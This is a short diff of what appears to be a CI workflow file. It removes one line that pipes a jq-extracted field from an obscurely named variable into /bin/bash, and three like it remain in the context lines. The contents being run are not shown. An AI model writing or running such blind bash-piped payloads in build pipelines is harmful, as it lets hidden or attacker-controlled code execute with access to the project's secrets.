@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$iifqt3" | jq -r .cyvls3 | /bin/bash
           printf '%s' "$dq3997" | jq -r .vxk176 | /bin/bash
           printf '%s' "$i443" | jq -r .ujqx8043 | /bin/bash
-          echo $eal6246 | jq -r .crusq8043 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
